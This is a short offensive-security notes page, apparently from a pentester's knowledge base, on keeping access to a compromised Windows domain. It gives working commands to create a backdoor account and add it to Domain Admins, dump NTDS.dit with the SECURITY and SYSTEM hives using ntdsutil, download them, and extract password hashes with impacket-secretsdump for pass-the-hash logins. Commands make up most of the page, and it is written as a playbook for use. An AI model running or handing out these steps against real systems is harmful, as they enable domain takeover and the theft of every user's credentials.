---
title: Windows Persistence
draft: false
tags:
  - windows
  - persistence
  - ntds-dit
  - add-user
  - secretsdump
---

## Plot

Let's say you have successfully compromised the target system as root. However, you might not have stable shell connection such as SSH or you might not know the password and only have reverse shell connection.

These connections are still shell but it is loud and ugly. It is also complicated to reproduce. 

 Below are several ways of maintaining persistence once gained shell as a root.

### Adding Domain Admin User

I can simply create a new user and add the user in Domain Admins group as such:

```bash
net user jadu jadu101 /add
net group "Domain Admins" /add jadu
```
![](https://i.imgur.com/AfmJPXJ.png)



Now with evil-winrm, I can sign in as the created user:

![](https://i.imgur.com/y8ojooG.png)


### Dumping NTDS.dit

I can dump **NTDS.dit** to obtain hashes for users and pass those hashes to gain connection to the machine.

Below command dumps **SECURITY**, **SYSTEM**, and **NTDS.dit** file to Temp folder which could be downloaded to dump password hashes:

`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`

![](https://i.imgur.com/5cMUA6O.png)


On **/Temp/registry**, I have **SECURITY** and **SYSTEM** file which I download to local machine:

```bash
download SECURITY
download SYSTEM
```
![](https://i.imgur.com/9NfYoBM.png)


On **/Temp/Active-Directory**, I have **NTDS.dit** file which I download to local machine as well:

```bash
download ntds.dit
```
![](https://i.imgur.com/ix6S7VR.png)


Now with **secretsdump**, I can obtain bunch of password hashes:

`root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`

![](https://i.imgur.com/yi7hUfY.png)


I can try to crack these hashes, but it is not necessary. I can pass the **NT** part of the hashes to gain shell connection:

![](https://i.imgur.com/OsTxNof.png)



[Here](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash) are more steps you can follow once you obtain hash for Administrator.
